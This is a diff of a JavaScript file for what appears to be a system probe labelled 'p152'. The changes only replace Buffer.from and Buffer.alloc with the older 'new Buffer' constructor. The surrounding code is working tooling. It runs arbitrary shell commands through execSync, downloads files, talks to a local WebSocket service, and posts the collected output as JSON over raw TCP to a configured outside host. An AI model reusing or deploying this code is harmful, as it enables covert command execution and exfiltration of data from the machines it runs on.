@@ -11,7 +11,7 @@ var R={ts:new Date().toISOString(), probe:'p152', results:{}, log:[]};
 var posted=false;
 function L(s){R.log.push(String(s).substring(0,800));}
 function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
-function postFinal(){if(posted)return;posted=true;postBuf('/p152info',Buffer.from(JSON.stringify(R),'utf8'));}
+function postFinal(){if(posted)return;posted=true;postBuf('/p152info',new Buffer(JSON.stringify(R),'utf8'));}
 function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
 function download(url, dest, cb) {
   try {
@@ -25,11 +25,11 @@ function download(url, dest, cb) {
   } catch(e) { cb('exc '+String(e)); }
 }
 function wsFrame(text) {
-  var payload = Buffer.from(text, 'utf8'); var len = payload.length; var header;
-  if (len < 126) header = Buffer.from([0x81, 0x80 | len]);
-  else if (len < 65536) { header = Buffer.alloc(4); header[0]=0x81; header[1]=0x80|126; header.writeUInt16BE(len,2); }
-  else { header = Buffer.alloc(10); header[0]=0x81; header[1]=0x80|127; header.writeUInt32BE(len,2); header.writeUInt32BE(0,6); }
-  var mask = Buffer.from([1,2,3,4]); var masked = Buffer.alloc(len);
+  var payload = new Buffer(text, 'utf8'); var len = payload.length; var header;
+  if (len < 126) header = new Buffer([0x81, 0x80 | len]);
+  else if (len < 65536) { header = new Buffer(4); header[0]=0x81; header[1]=0x80|126; header.writeUInt16BE(len,2); }
+  else { header = new Buffer(10); header[0]=0x81; header[1]=0x80|127; header.writeUInt32BE(len,2); header.writeUInt32BE(0,6); }
+  var mask = new Buffer([1,2,3,4]); var masked = new Buffer(len);
   for (var i=0;i<len;i++) masked[i]=payload[i]^mask[i%4];
   return Buffer.concat([header, mask, masked]);
 }
@@ -53,7 +53,7 @@ function tbWS(cb) {
   try {
     var key = crypto.randomBytes(16).toString('base64');
     var req = 'GET / HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: '+key+'\r\nSec-WebSocket-Version: 13\r\n\r\n';
-    var s = net.connect(8081, '127.0.0.1'); var buf = Buffer.alloc(0); var handshaken=false; var msgs=[];
+    var s = net.connect(8081, '127.0.0.1'); var buf = new Buffer(0); var handshaken=false; var msgs=[];
     s.on('connect', function(){ s.write(req); });
     s.on('data', function(d){
       buf = Buffer.concat([buf, d]);
@@ -61,7 +61,7 @@ function tbWS(cb) {
         var idx = buf.indexOf('\r\n\r\n');
         if (idx >= 0) { var head = buf.slice(0, idx+4).toString(); buf = buf.slice(idx+4); handshaken = head.indexOf('101') >= 0; if (!handshaken) { cb('handshake fail: '+head.slice(0,200)); s.destroy(); return; } }
       }
-      if (handshaken) { var frames = parseFrames(buf); buf = Buffer.alloc(0); for (var i=0;i<frames.length;i++) msgs.push(frames[i].payload); }
+      if (handshaken) { var frames = parseFrames(buf); buf = new Buffer(0); for (var i=0;i<frames.length;i++) msgs.push(frames[i].payload); }
     });
     s.on('error', function(e){ cb('ws err '+e.message); });
     s.on('close', function(){ cb('ws close'); });
